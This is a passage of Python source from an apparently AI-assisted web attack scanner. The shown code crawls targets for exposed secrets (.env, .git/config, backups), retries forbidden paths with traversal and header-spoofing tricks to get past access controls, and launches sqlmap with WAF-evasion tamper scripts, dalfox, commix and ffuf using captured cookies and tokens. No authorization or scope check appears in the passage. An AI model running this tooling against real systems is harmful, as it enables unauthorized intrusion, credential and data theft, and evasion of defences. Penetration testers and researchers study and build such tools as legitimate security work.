        if r0["status"] == 0:
            return BaselineFingerprint(0,0,"","",0,"",0,[])

        h0 = hashlib.md5(r0["body"].encode()).hexdigest()
        timings.append(r0["timing"]); sizes.append(len(r0["body"]))
        hashes.append(h0); statuses.append(r0["status"]); bodies.append(r0["body"])

        r1 = _req()
        if r1["status"] != 0:
            h1 = hashlib.md5(r1["body"].encode()).hexdigest()
            timings.append(r1["timing"]); sizes.append(len(r1["body"]))
            hashes.append(h1); statuses.append(r1["status"]); bodies.append(r1["body"])
            if h1 != h0:
                r2 = _req()
                if r2["status"] != 0:
                    timings.append(r2["timing"]); sizes.append(len(r2["body"]))
                    hashes.append(hashlib.md5(r2["body"].encode()).hexdigest())
                    statuses.append(r2["status"]); bodies.append(r2["body"])
        if not statuses:
            return BaselineFingerprint(0,0,"","",0,"",0,[])
        body = bodies[-1]
        fp   = BaselineFingerprint(
            status=max(set(statuses), key=statuses.count),
            body_len=int(sum(sizes)/len(sizes)),
            body_hash=max(set(hashes), key=hashes.count),
            title=self._title(body),
            timing_avg=round(sum(timings)/len(timings),3),
            headers_sig="", word_count=len(body.split()),
            error_strings=self._errors(body),
        )
        self._cache[key] = fp
        return fp

    def diff(self, bl: BaselineFingerprint, resp: dict, timing: float) -> dict:
        body   = resp.get("body","")
        b_hash = hashlib.md5(body.encode()).hexdigest()
        td     = round(timing - bl.timing_avg, 3)
        return {
            "status_changed": resp["status"] != bl.status,
            "status_diff":    f"{bl.status} → {resp['status']}",
            "size_diff":      len(body) - bl.body_len,
            "size_pct":       round(abs(len(body)-bl.body_len) / max(bl.body_len,1)*100, 1),
            "hash_changed":   b_hash != bl.body_hash,
            "timing_diff":    td,
            # TIME ANOMALY: response must be >3s slower than baseline (baseline must be fast)
            "time_anomaly":   timing > 3.0 and td > 2.5 and bl.timing_avg < 1.5,
            "new_errors":     [e for e in self._errors(body) if e not in bl.error_strings],
            "word_diff":      len(body.split()) - bl.word_count,
            "sensitive_keys": RiskScorer.score_body(body),
            "is_custom_404":  self._is_404(resp, body),
        }

    def is_real_200(self, resp: dict) -> dict:
        body   = resp.get("body","")
        status = resp.get("status",0)
        if status != 200:
            return {"real": False, "reason": f"Status {status}", "ai_needed": False}
        if self._404fp:
            h = hashlib.md5(body.encode()).hexdigest()
            if h == self._404fp.body_hash or (
                abs(len(body)-self._404fp.body_len) < 50 and
                self._title(body) == self._404fp.title
            ):
                return {"real": False, "reason": "Custom 404", "ai_needed": False}
        if len(body) < 80:
            return {"real": False, "reason": "Too short", "ai_needed": False}
        return {"real": True, "reason": "OK", "ai_needed": False}

    def _is_404(self, resp: dict, body: str) -> bool:
        if not self._404fp: return False
        return abs(len(body)-self._404fp.body_len) < 50 and \
               self._title(body) == self._404fp.title

    def _title(self, body: str) -> str:
        m = re.search(r'<title[^>]*>(.*?)</title>', body, re.I|re.S)
        return m.group(1).strip()[:100] if m else ""

    def _errors(self, body: str) -> list:
        pats = [
            r"(?i)(exception|traceback|fatal error|parse error|syntax error)",
            r"SQL syntax|mysql_|ORA-\d+|pg::syntax",
            r"stack trace|at line \d+",
        ]
        found = []
        for p in pats:
            for m in re.finditer(p, body):
                found.append(m.group()[:50])
        return list(set(found))[:15]

    def diff_is_interesting(self, diff: dict) -> bool:
        """
        FIXED v8: Much stricter — error-to-error is never interesting.
        Time anomaly requires fast baseline AND slow response.
        """
        sd = diff.get("status_diff","")
        sc = diff.get("status_changed", False)

        # Error-to-error: NOT interesting
        if sc and "→" in sd:
            try:
                old, new = (int(x.strip()) for x in sd.split("→"))
                if old >= 400 and new >= 400:
                    return bool(diff.get("time_anomaly"))
            except Exception:
                pass

        # Strong signals
        if diff.get("time_anomaly"):         return True
        if diff.get("new_errors"):           return True
        if diff.get("sensitive_keys"):       return True

        # Status change to 200 from 4xx
        if sc and "→" in sd:
            try:
                old, new = (int(x.strip()) for x in sd.split("→"))
                if old >= 400 and new == 200:  return True
            except Exception:
                pass

        # Large size increase with content
        if diff.get("size_pct", 0) > 30 and diff.get("size_diff", 0) > 200:
            return True

        return False


# ─────────────────────────────────────────────────────────────────────────────
# CRAWLER
# ─────────────────────────────────────────────────────────────────────────────
class Crawler:
    def __init__(self, client: HTTPClient, ai: AIEngine, base_url: str):
        self.client          = client
        self.ai              = ai
        self.base            = base_url
        self.base_host       = urllib.parse.urlparse(base_url).netloc
        self.visited:  Set[str]       = set()
        self.endpoints: List[Endpoint] = []
        self.forbidden: Set[str]       = set()
        self.acl_findings: list        = []
        self.auth_walls: list          = []
        self.site_tech: dict           = {}
        # Template-based dedup: template → count
        self._templates: dict          = {}
        self._lock  = threading.Lock()
        self._q     = queue.Queue()

    def crawl(self, max_depth: int = MAX_CRAWL_DEPTH) -> List[Endpoint]:
        console.print(f"\n[bold cyan]━━ CRAWLER ━━[/bold cyan]")
        self._probe_well_known()
        self._q.put((self.base, 0))
        threads = [threading.Thread(target=self._worker, daemon=True)
                   for _ in range(min(MAX_WORKERS, 4))]
        for t in threads: t.start()
        self._q.join()
        console.print(f"  [dim]  403 paths found: {len(self.forbidden)} — probing...[/dim]")
        self._probe_forbidden()
        console.print(
            f"[green]✓ Crawl: {len(self.endpoints)} endpoints, "
            f"{len(self.forbidden)} forbidden, "
            f"{len(self.acl_findings)} bypass candidates[/green]"
        )
        return self.endpoints

    def _probe_well_known(self):
        base      = self.base.rstrip("/")
        root_resp = self.client.get(base)
        if root_resp["status"] != 0:
            self.site_tech = RiskScorer.detect_tech(root_resp)

        well_known = [
            "/robots.txt","/sitemap.xml","/.well-known/openid-configuration",
            "/swagger.json","/swagger/v1/swagger.json","/openapi.json",
            "/api-docs","/v1/api-docs","/v2/api-docs",
            "/graphql","/graphiql",
            "/.env","/.env.local","/.env.production","/.env.backup",
            "/config.php","/config.json","/config.yaml","/config.yml",
            "/web.config","/appsettings.json","/application.properties",
            "/phpinfo.php","/info.php",
            "/backup.zip","/backup.sql","/.git/HEAD","/.git/config",
            "/debug","/debug/vars",
            "/actuator","/actuator/env","/actuator/health","/actuator/mappings",
            "/metrics","/health","/status","/ping",
            "/admin","/administrator","/admin/login","/phpmyadmin",
            "/console","/h2-console",
            "/swagger-ui.html","/redoc",
            "/storage/logs/laravel.log","/logs/error.log",
        ]
        for path in well_known:
            url = base + path
            if url in self.visited: continue
            r   = self.client.get(url)
            if r["status"] == 0: continue
            with self._lock: self.visited.add(url)

            if not self.site_tech.get("lang") or self.site_tech.get("lang") == "unknown":
                d = RiskScorer.detect_tech(r)
                if d.get("lang") != "unknown": self.site_tech.update(d)

            status = r["status"]
            body   = r["body"]
            parsed_path = urllib.parse.urlparse(url).path

            if status == 403:
                self.forbidden.add(parsed_path)
                console.print(f"  [yellow]🔒 403 {url}[/yellow]")
            elif status in (401,302):
                self.forbidden.add(parsed_path)
                self.auth_walls.append({"url":url,"status":status,"body_snippet":body[:400],"signal":f"HTTP {status}"})
            elif status in (200,206):
                ep = self._to_endpoint(url,"GET",0,"well_known")
                ep.score = RiskScorer.score_url(url) + 20
                with self._lock: self.endpoints.append(ep)
                console.print(f"  [green]✓ {status} {url}[/green] [dim]({len(body)}b)[/dim]")
                if path == "/robots.txt":   self._parse_robots(body, base)
                elif "sitemap" in path:     self._parse_sitemap(body, base)

    def _parse_robots(self, body: str, base: str):
        for m in re.finditer(r'(?:Disallow|Allow):\s*(/\S*)', body, re.I):
            path = m.group(1).split("*")[0].rstrip("/")
            if path and len(path) > 1:
                url = base + path
                if url not in self.visited: self._q.put((url,1))

    def _parse_sitemap(self, body: str, base: str):
        for url in re.findall(r'<loc>(.*?)</loc>', body, re.I)[:100]:
            url = url.strip()
            if self._same_host(url) and url not in self.visited:
                self._q.put((url,1))

    def _probe_forbidden(self):
        if not self.forbidden: return
        suffixes = [
            "/","/index","/index.php","/index.html",
            "/list","/get","/info","/view","/show",
            "/api","/data","/export","/backup",
            "/config","/settings","/users","/logs",
            "/dashboard","/panel","/manage",
            "/../","/%2e%2e/","/.;/",
            "?debug=true","?test=1","?admin=1",
        ]
        base = self.base.rstrip("/")
        for fpath in list(self.forbidden):
            parent = base + fpath
            for suffix in suffixes:
                url = parent + suffix
                if url in self.visited: continue
                r = self.client.get(url)
                with self._lock: self.visited.add(url)

                if r["status"] in (200, 201, 202):
                    # ── BUG FIX: endpoint AVVAL qo'shiladi, AI dan OLDIN ──────
                    # Oldin: AI "real BAC emas" desa endpoint yo'qolib ketardi.
                    # Endi: 200 qaytargan har bir child endpoint ga qo'shiladi.
                    # AI faqat acl_findings uchun ishlatiladi (score uchun).
                    ep = self._to_endpoint(url, "GET", 0, "forbidden_child")
                    ep.score = 25  # past score — keyin oshadi
                    with self._lock:
                        self.endpoints.append(ep)

                    # AI tekshir — real BAC bo'lsa score oshiriladi
                    ai_r = self.ai.analyze_403_response(
                        parent_url=parent, child_url=url,
                        child_status=r["status"], child_body=r["body"],
                        child_headers=r.get("headers",{}),
                        context="forbidden_probe",
                    )
                    if ai_r and ai_r.get("is_real_bac") and ai_r.get("confidence",0) >= MIN_CONFIDENCE:
                        console.print(f"  [bold red]🚨 BAC confirmed: {url}[/bold red]")
                        ep.score = 90  # real BAC — top priority
                        self.acl_findings.append({
                            "parent_403": parent, "child_200": url,
                            "body_size": len(r["body"]), "body_snippet": r["body"][:400],
                            "ai_reason": ai_r.get("reason",""), "confidence": ai_r.get("confidence",0),
                        })
                    else:
                        # AI "real BAC emas" dedi — lekin endpoint saqlanib qoldi
                        # Sabab: /admin/config 200 qaytarsa, u balki login page,
                        # lekin keyinchalik fuzz qilish uchun kerak bo'lishi mumkin
                        reason = ai_r.get("reason","") if ai_r else "AI unavailable"
                        console.print(f"  [dim]  → child 200 (not BAC): {url} — {reason}[/dim]")

                elif r["status"] == 403:
                    # Recursive — 403 child ham queue ga
                    with self._lock:
                        self.forbidden.add(urllib.parse.urlparse(url).path)

    def _worker(self):
        while True:
            try:
                url, depth = self._q.get(timeout=3)
            except queue.Empty:
                break
            try:
                self._process(url, depth)
            except Exception as e:
                console.print(f"  [dim red]  Crawl: {e}[/dim red]")
            finally:
                self._q.task_done()

    def _process(self, url: str, depth: int):
        with self._lock:
            if url in self.visited or len(self.visited) >= MAX_URLS:
                return
            self.visited.add(url)
        r = self.client.get(url)
        if r["status"] == 0: return

        status = r["status"]
        body   = r["body"]

        if not self.site_tech.get("lang") or self.site_tech.get("lang") == "unknown":
            d = RiskScorer.detect_tech(r)
            if d.get("lang") != "unknown":
                with self._lock: self.site_tech.update(d)

        if status in (403,401):
            with self._lock: self.forbidden.add(urllib.parse.urlparse(url).path)
        elif status == 302:
            loc = r["headers"].get("location","").lower()
            if any(x in loc for x in ["/login","/signin","/auth"]):
                with self._lock: self.forbidden.add(urllib.parse.urlparse(url).path)

        # Template-based dedup: don't crawl more than 3 of same template
        template = _normalize_url_template(url)
        with self._lock:
            count = self._templates.get(template, 0)
            if count >= 3:
                return
            self._templates[template] = count + 1

        ep          = self._to_endpoint(url,"GET",depth,"crawler")
        ep.score    = RiskScorer.score_url(url)
        ep.template = template

        sens = RiskScorer.score_body(body)
        if sens: ep.score += 30

        auth_signals = ["login required","please log in","please login",
                        "you must be logged in","authentication required",
                        "unauthorized","permission denied","members only"]
        body_lower = body.lower()[:800]
        if any(s in body_lower for s in auth_signals):
            ep.score += 40
            with self._lock:
                self.forbidden.add(urllib.parse.urlparse(url).path)
                self.auth_walls.append({
                    "url": url, "status": status,
                    "body_snippet": body[:400], "signal": "body_signal"
                })

        with self._lock: self.endpoints.append(ep)

        if depth >= MAX_CRAWL_DEPTH: return

        for link in self._extract_links(body, url):
            with self._lock:
                if link not in self.visited and len(self.visited) < MAX_URLS:
                    self._q.put((link, depth+1))

        for form_ep in self._extract_forms(body, url):
            with self._lock: self.endpoints.append(form_ep)

        # JS endpoint extraction
        all_js  = re.findall(r'<script[^>]*>(.*?)</script>', body, re.S|re.I)
        js_srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', body, re.I)
        for src in js_srcs:
            js_url = self._resolve(src, url)
            if js_url and self._same_host(js_url) and js_url not in self.visited:
                r2 = self.client.get(js_url)
                if r2["status"] == 200:
                    all_js.append(r2["body"])
                    with self._lock: self.visited.add(js_url)
        for js in all_js:
            for ep in self._extract_js_endpoints(js, url):
                with self._lock: self.endpoints.append(ep)

    def _extract_links(self, body: str, base: str) -> List[str]:
        links = []
        for pat in [
            r'href=["\']([^"\'#?][^"\']*)["\']',
            r'action=["\']([^"\']+)["\']',
            r'data-url=["\']([^"\']+)["\']',
            r'router\.push\(["\']([^"\']+)["\']',
        ]:
            for m in re.finditer(pat, body, re.I):
                u = self._resolve(m.group(1), base)
                if u and self._same_host(u): links.append(u)
        return list(set(links))

    def _extract_forms(self, body: str, base_url: str) -> List[Endpoint]:
        eps = []
        for attrs, content in re.findall(r'<form([^>]*)>(.*?)</form>', body, re.S|re.I):
            action  = re.search(r'action=["\']([^"\']*)["\']', attrs, re.I)
            method  = re.search(r'method=["\']([^"\']*)["\']', attrs, re.I)
            enctype = re.search(r'enctype=["\']([^"\']*)["\']', attrs, re.I)
            url     = self._resolve(action.group(1) if action else "", base_url) or base_url
            meth    = (method.group(1) if method else "GET").upper()
            enc     = (enctype.group(1) if enctype else "form").lower()
            params  = {}
            for inp in re.finditer(r'<(?:input|textarea|select)([^>]*)>', content, re.I):
                ia = inp.group(1)
                nm = re.search(r'name=["\']([^"\']+)["\']', ia, re.I)
                vl = re.search(r'value=["\']([^"\']*)["\']', ia, re.I)
                tp = re.search(r'type=["\']([^"\']+)["\']', ia, re.I)
                if nm and (tp.group(1).lower() if tp else "text") not in (
                    "submit","button","image","reset"
                ):
                    params[nm.group(1)] = vl.group(1) if vl else ""
            bt = "multipart" if "multipart" in enc else ("json" if "json" in enc else "form")
            eps.append(Endpoint(url=url, method=meth, params=params,
                                body_type=bt, discovered_by="form"))
        return eps

    def _extract_js_endpoints(self, js: str, base: str) -> List[Endpoint]:
        eps = []
        for pat in [
            r'(?:fetch|axios\.(?:get|post|put|delete|patch))\s*\(["\']([^"\']+)["\']',
            r'(?:url|endpoint|api_url|baseURL)\s*[:=]\s*["\']([/][^"\']{3,})["\']',
            r'["\']([/](?:api|v\d|graphql|rest|gql)[/][^"\'?\s]{2,})["\']',
        ]:
            for m in re.finditer(pat, js, re.I):
                u = self._resolve(m.group(1), base)
                if u and self._same_host(u):
                    eps.append(self._to_endpoint(u,"GET",0,"js"))
        return eps

    def _to_endpoint(self, url: str, method: str, depth: int, source: str) -> Endpoint:
        parsed = urllib.parse.urlparse(url)
        params = {f"query:{k}": v for k, v in urllib.parse.parse_qsl(parsed.query)}
        return Endpoint(url=url, method=method, params=params,
                        discovered_by=source, depth=depth,
                        template=_normalize_url_template(url))

    def _resolve(self, href: str, base: str) -> Optional[str]:
        if not href or href.startswith(("mailto:","tel:","javascript:","#","data:")):
            return None
        try:
            return urllib.parse.urljoin(base, href).split("#")[0]
        except Exception:
            return None

    def _same_host(self, url: str) -> bool:
        try: return urllib.parse.urlparse(url).netloc == self.base_host
        except Exception: return False


# ─────────────────────────────────────────────────────────────────────────────
# PARAMETER DISCOVERER
# ─────────────────────────────────────────────────────────────────────────────
class ParamDiscoverer:
    INTERESTING_HEADERS = [
        "X-User-Id","X-User","X-Role","X-Admin","X-Privilege",
        "X-Forwarded-For","X-Real-IP","X-Original-URL","X-Rewrite-URL",
        "X-Custom-IP-Authorization","X-Forwarded-Host",
        "X-HTTP-Method-Override","X-Debug","Authorization","X-API-Key",
    ]

    def __init__(self, client: HTTPClient):
        self.client = client

    def discover(self, ep: Endpoint) -> Endpoint:
        r = self.client.get(ep.url) if ep.method == "GET" \
            else self.client.post(ep.url, data=ep.params)
        if r["status"] == 0: return ep
        body = r["body"]
        ct   = r["headers"].get("content-type","").lower()

        # Path params
        parsed = urllib.parse.urlparse(ep.url)
        for k, v in urllib.parse.parse_qsl(parsed.query):
            ep.params[f"query:{k}"] = v
        for m in re.finditer(r'/(\d+)(?=/|$)', parsed.path):
            ep.params["path:id"] = m.group(1)

        ep.params.update(self._from_forms(body))
        ep.params.update(self._from_hidden(body))

        if "json" in ct or ep.body_type == "json":
            ep.body_type = "json"
            ep.params.update(self._from_json(body))

        ep.params.update(self._from_js_vars(body))
        ep.params.update(self._from_cookies(r["headers"]))

        for h in self.INTERESTING_HEADERS:
            ep.params[f"header:{h}"] = ""

        return ep

    def _from_forms(self, body: str) -> dict:
        params = {}
        for m in re.finditer(
            r'<(?:input|textarea|select)[^>]+name=["\']([^"\']+)["\'][^>]*'
            r'(?:value=["\']([^"\']*)["\'])?', body, re.I
        ):
            tp = re.search(r'type=["\']([^"\']+)["\']', m.group(0), re.I)
            if (tp.group(1).lower() if tp else "text") not in ("submit","button","image","reset"):
                params[f"form:{m.group(1)}"] = m.group(2) or ""
        return params

    def _from_hidden(self, body: str) -> dict:
        return {
            f"hidden:{m.group(1)}": m.group(2)
            for m in re.finditer(
                r'<input[^>]+type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
                body, re.I
            )
        }

    def _from_json(self, body: str) -> dict:
        params = {}
        try:
            data = json.loads(body)
            for k, v in self._flatten(data).items():
                params[f"json:{k}"] = str(v)[:100]
        except Exception:
            for m in re.finditer(r'\{[^{}]{10,500}\}', body):
                try:
                    obj = json.loads(m.group())
                    for k, v in obj.items():
                        if isinstance(v, (str,int,float,bool)):
                            params[f"json:{k}"] = str(v)[:50]
                except Exception:
                    pass
        return params

    def _from_js_vars(self, body: str) -> dict:
        params = {}
        sensitive = {"id","token","key","user","role","secret","api","auth","session","csrf"}
        for m in re.finditer(r'(?:var|let|const)\s+(\w+)\s*=\s*["\']([^"\']{1,80})["\']', body):
            if any(s in m.group(1).lower() for s in sensitive):
                params[f"js:{m.group(1)}"] = m.group(2)
        return params

    def _from_cookies(self, headers: dict) -> dict:
        params  = {}
        cookies = headers.get("set-cookie","")
        if not cookies: return params
        for part in cookies.split(";"):
            part = part.strip()
            if "=" in part and not any(k in part.lower() for k in
                ["path=","domain=","expires=","max-age=","samesite=","httponly","secure"]):
                k, v = part.split("=",1)
                params[f"cookie:{k.strip()}"] = v.strip()[:50]
        return params

    def _flatten(self, obj: Any, prefix: str = "", depth: int = 0) -> dict:
        r = {}
        if depth > 4: return r
        if isinstance(obj, dict):
            for k, v in obj.items():
                r.update(self._flatten(v, f"{prefix}{k}.", depth+1))
        elif isinstance(obj, list) and obj:
            r.update(self._flatten(obj[0], f"{prefix}0.", depth+1))
        else:
            r[prefix.rstrip(".")] = obj
        return r


# ─────────────────────────────────────────────────────────────────────────────
# SESSION MANAGER
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class RoleContext:
    name:      str
    client:    HTTPClient
    session:   SessionContext
    logged_in: bool = False

class SessionManager:
    def __init__(self, base_client: HTTPClient, ai: AIEngine):
        self.base_client = base_client
        self.ai          = ai
        self.roles: dict = {"anonymous": RoleContext("anonymous",base_client,base_client.session)}

    def add_role(self, name: str, login_url: str,
                 username: str, password: str) -> bool:
        sess   = SessionContext()
        client = HTTPClient(sess)
        ok     = self._login(client, login_url, username, password)
        self.roles[name] = RoleContext(name, client, sess, logged_in=ok)
        if ok: console.print(f"[green]✓ Role '{name}' logged in as {username}[/green]")
        else:  console.print(f"[red]✗ Role '{name}' login failed[/red]")
        return ok

    def _login(self, client: HTTPClient, url: str, user: str, pwd: str) -> bool:
        resp  = client.get(url)
        if resp["status"] == 0: return False
        csrf  = self._csrf(resp["body"])
        fmap  = self.ai.identify_login_fields(resp["body"], url)
        data  = {
            fmap.get("username_field","username"): user,
            fmap.get("password_field","password"):  pwd,
        }
        if csrf: data[fmap.get("csrf_field","csrf_token")] = csrf
        r2 = client.post(url, data=data)
        return self._check(r2, user)

    def _csrf(self, body: str) -> str:
        for p in [
            r'<input[^>]+name=["\'](?:csrf[_-]?token|_token|csrfmiddlewaretoken|authenticity_token)["\'][^>]+value=["\']([^"\']+)["\']',
            r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']',
            r'"csrf_?[Tt]oken"\s*:\s*"([^"]+)"',
        ]:
            m = re.search(p, body, re.I)
            if m: return m.group(1)
        return ""

    def _check(self, resp: dict, username: str) -> bool:
        if resp["status"] in (301,302):
            loc = resp["headers"].get("location","")
            return not any(x in loc.lower() for x in ["/login","/signin","/error"])
        body = resp["body"].lower()
        if any(s in body for s in ["invalid password","login failed","wrong password","invalid credentials"]):
            return False
        if any(s in body for s in ["dashboard","welcome","logout","profile",username.lower()]):
            return True
        return resp["status"] == 200

    def compare(self, url: str, method: str = "GET",data: dict = None) -> dict:
        results = {}
        for name, ctx in self.roles.items():
            r = ctx.client.get(url) if method=="GET" else ctx.client.post(url,data=data or {})
            results[name] = {
                "status": r["status"], "size": len(r["body"]),
                "hash":   hashlib.md5(r["body"].encode()).hexdigest(),
                "snippet": r["body"][:300],
                "has_sensitive": bool(RiskScorer.score_body(r["body"])),
            }
        return results

    def detect_bac(self, url: str, method: str = "GET",
                   data: dict = None) -> Optional[dict]:
        if len(self.roles) < 2: return None
        responses  = self.compare(url, method, data)
        role_list  = list(responses.items())
        comparisons = []
        for i in range(len(role_list)):
            for j in range(i+1, len(role_list)):
                rn1, r1 = role_list[i]
                rn2, r2 = role_list[j]
                if r1["status"]==0 or r2["status"]==0: continue
                if r1["status"]==200 and r2["status"] in (401,403):
                    comparisons.append({"role_a":rn1,"role_b":rn2,"signal":"lower_role_access"})
                if rn1=="anonymous" and r1["status"]==200 and r2["status"]==200:
                    comparisons.append({"role_a":"anonymous","role_b":rn2,"signal":"anon_access"})
        if comparisons:
            return {"url":url,"method":method,"responses":responses,"comparisons":comparisons}
        return None


# ─────────────────────────────────────────────────────────────────────────────
# KALI TOOL RUNNER
# ─────────────────────────────────────────────────────────────────────────────
class KaliToolRunner:
    def __init__(self, session: SessionContext):
        self.session = session

    def _cookie_str(self) -> str:
        return "; ".join(f"{k}={v}" for k,v in self.session.cookies.items())

    def _auth(self, tool: str) -> str:
        opts = ""
        if self.session.cookies:
            c = self._cookie_str()
            opts += f' --cookie="{c}"' if tool=="sqlmap" else f" -H 'Cookie: {c}'"
        if self.session.jwt_token:
            opts += f" -H 'Authorization: Bearer {self.session.jwt_token}'"
        return opts

    def sqlmap(self, url: str, param: str, method: str = "GET",
               data: str = "") -> dict:
        if not shutil.which("sqlmap"):
            return {"tool":"sqlmap","available":False,"output":"not found"}
        auth  = self._auth("sqlmap")
        pname = param.split(":")[-1]
        # WAF aniqlangan bo'lsa tamper script qo'shish
        waf_detected = getattr(self, "_waf_detected", False)
        tamper = ""
        if waf_detected:
            tamper = "--tamper=space2comment,charencode,between"
        # Deep mode yoki WAF bo'lsa kuchli, aks holda tez
        level   = 3
        risk    = 2
        timeout = 30
        base = (f"sqlmap -u '{url}' --batch "
                f"--level={level} --risk={risk} --timeout={timeout} "
                f"--retries=2 --threads=3 "
                f"--technique=BEUSTQ "
                f"{tamper} {auth}")
        cmd = f"{base} --data='{data}' -p '{pname}'" if method=="POST" and data \
              else f"{base} -p '{pname}'"
        r     = _run_cmd(cmd, timeout=120)
        r["tool"] = "sqlmap"; return r

    def dalfox(self, url: str, param: str = "", data: str = "",
               method: str = "GET") -> dict:
        if not shutil.which("dalfox"):
            return {"tool":"dalfox","available":False,"output":"not found"}
        auth  = self._auth("dalfox")
        pname = param.split(":")[-1]
        cmd   = f"dalfox url '{url}' {'--data '+repr(data) if method=='POST' and data else ''} --silence {auth}"
        if pname: cmd += f" --param {pname}"
        r = _run_cmd(cmd, timeout=60)
        r["tool"] = "dalfox"; return r

    def commix(self, url: str, param: str = "", data: str = "",
               method: str = "GET") -> dict:
        if not shutil.which("commix"):
            return {"tool":"commix","available":False,"output":"not found"}
        auth  = self._auth("commix")
        pname = param.split(":")[-1]
        cmd   = f"commix --url='{url}' {'--data='+repr(data) if method=='POST' and data else ''} --batch {auth}"
        if pname: cmd += f" -p {pname}"
        r = _run_cmd(cmd, timeout=90)
        r["tool"] = "commix"; return r

    def nikto(self, target: str) -> dict:
        if not shutil.which("nikto"):
            return {"tool":"nikto","available":False,"output":"not found"}
        r = _run_cmd(f"nikto -h '{target}' -nointeractive -timeout 10 -maxtime 90s", timeout=120)
        r["tool"] = "nikto"; return r

    def smart_ffuf(self, base_url: str, wordlist: str,
                   profile: SmartFuzzProfile, mode: str = "dir",
                   max_time_seconds: int = 90) -> dict:
        if not shutil.which("ffuf"):
            return {"tool":"ffuf","available":False,"output":"not found","results":[]}
        if not wordlist or not Path(wordlist).exists():
            return {"tool":"ffuf","available":False,"output":"no wordlist","results":[]}
        auth       = self._auth("ffuf")
        filt       = profile.ffuf_filter_args()
        base       = base_url.rstrip("/")
        fuzz_url   = f"{base}/FUZZ" if mode=="dir" else f"{base}?FUZZ=pentest"
        out_file   = f"/tmp/ffuf_{hashlib.md5(base_url.encode()).hexdigest()[:8]}.json"
        cmd        = (
            f"ffuf -u '{fuzz_url}' -w '{wordlist}' "
            f"-mc {','.join(str(c) for c in profile.match_codes)} "
            f"{filt} -t 30 -timeout 8 -maxtime {max_time_seconds} "
            f"-o '{out_file}' -of json -s {auth}"
        )
        console.print(
            f"  [dim]  ffuf: {Path(wordlist).name} -> {fuzz_url} "
            f"(maxtime={max_time_seconds}s)[/dim]"
        )
        _run_cmd(cmd, timeout=max_time_seconds + 15)
        results = []
        try:
            if Path(out_file).exists():
                data = json.loads(Path(out_file).read_text())
                for item in data.get("results",[]):
                    results.append({
                        "input":  item.get("input",{}).get("FUZZ",""),
                        "status": item.get("status",0),
                        "size":   item.get("length",0),
                        "words":  item.get("words",0),
                        "lines":  item.get("lines",0),
                        "url":    item.get("url",""),
                    })
                try:
                    Path(out_file).unlink()
                except Exception:
                    pass
        except Exception:
            pass
        console.print(f"  [dim]  ffuf result: {len(results)} hit(s)[/dim]")
        return {"tool":"ffuf","available":True,"output":"","results":results}


# ─────────────────────────────────────────────────────────────────────────────
# ENDPOINT INTELLIGENCE
# ─────────────────────────────────────────────────────────────────────────────
class EndpointIntelligence:
    """
    URL va parametrlardan endpoint tipini va ustuvor testlarni aniqlaydi.
    """
    ENDPOINT_RULES = {
        "SEARCH": {
            "url_signals":   ["search", "find", "lookup", "query", "filter", "browse",
                               "autocomplete", "suggest", "typeahead", "fulltext"],
            "param_signals": ["q", "query", "search", "keyword", "keywords", "term",
                               "terms", "s", "k", "w", "text", "find", "filter",
                               "fulltext", "fts", "autocomplete"],
            "priority_tests": ["sqli", "xss", "ssti", "nosqli"],
            "context_hint":  "Search/filter endpoint — SQL/XSS/SSTI injection CRITICAL priority. Search params often hit DB logic directly.",
        },
        "AUTH": {
            "url_signals":   ["login", "signin", "sign-in", "log-in", "auth",
                               "authenticate", "register", "signup", "sign-up",
                               "logout", "signout", "session", "token", "oauth",
                               "saml", "sso", "mfa", "2fa", "verify"],
            "param_signals": ["username", "password", "user", "pass", "passwd",
                               "email", "login", "credential", "token", "otp",
                               "code", "secret", "api_key", "auth"],
            "priority_tests": ["sqli", "default_creds", "rate_limit", "username_enum", "ssti"],
            "context_hint":  "Authentication endpoint — SQLi bypass, brute force, and username enumeration are critical.",
        },
        "FILE_PATH": {
            "url_signals":   ["file", "upload", "download", "media", "attachment",
                               "document", "image", "asset", "static", "resource",
                               "content", "load"],
            "param_signals": ["file", "path", "filepath", "filename", "dir",
                               "directory", "folder", "page", "include", "load",
                               "template", "tpl", "view", "doc", "document",
                               "conf", "config", "layout", "src", "source"],
            "priority_tests": ["lfi", "path_traversal", "ssrf"],
            "context_hint":  "File/path parameter endpoint — LFI and traversal are high priority.",
        },
        "REDIRECT": {
            "url_signals":   ["redirect", "callback", "return", "next", "goto",
                               "forward", "bounce", "refer", "continue"],
            "param_signals": ["url", "redirect", "next", "return", "return_to",
                               "dest", "destination", "target", "callback",
                               "href", "link", "goto", "after", "forward",
                               "success_url", "failure_url", "cancel_url"],
            "priority_tests": ["ssrf", "open_redirect"],
            "context_hint":  "Redirect/callback parameter — SSRF and open redirect are high priority.",
        },
        "ID_BASED": {
            "url_signals":   ["/user/", "/item/", "/product/", "/post/", "/order/",
                               "/account/", "/profile/", "/detail/", "/view/",
                               "/object/", "/record/", "/entry/"],
            "param_signals": ["id", "uid", "user_id", "item_id", "product_id",
                               "account_id", "profile_id", "post_id", "order_id",
                               "comment_id", "ticket_id", "issue_id", "ref",
                               "record_id", "entity_id", "object_id"],
            "priority_tests": ["idor", "sqli", "test_auth"],
            "context_hint":  "ID-based endpoint — IDOR and access control checks are high priority.",
        },
        "COMMAND": {
            "url_signals":   ["exec", "run", "system", "cmd", "command", "ping",
                               "trace", "lookup", "resolve", "execute", "shell",
                               "process", "job", "task"],
            "param_signals": ["cmd", "exec", "command", "system", "ping",
                               "host", "ip", "hostname", "domain", "address",
                               "target", "query", "job", "script"],
            "priority_tests": ["cmdi", "ssrf", "ssti"],
            "context_hint":  "Command/system parameter — OS command injection is critical.",
        },
        "ADMIN": {
            "url_signals":   ["admin", "administration", "dashboard", "management",
                               "panel", "manage", "control", "settings", "config",
                               "backoffice", "staff", "internal", "private"],
            "param_signals": ["role", "admin", "is_admin", "privilege", "level",
                               "permission", "access", "status", "verified",
                               "approved", "superuser", "group", "tier"],
            "priority_tests": ["test_auth", "idor", "mass_assign", "param_tamper"],
            "context_hint":  "Admin/management endpoint — privilege escalation and auth bypass are critical.",
        },
        "PAYMENT": {
            "url_signals":   ["pay", "payment", "checkout", "order", "purchase",
                               "transfer", "transaction", "invoice", "refund",
                               "withdraw", "deposit", "balance", "coupon", "promo"],
            "param_signals": ["amount", "price", "total", "qty", "quantity",
                               "discount", "coupon", "code", "balance", "credit"],
            "priority_tests": ["business_logic", "idor", "sqli"],
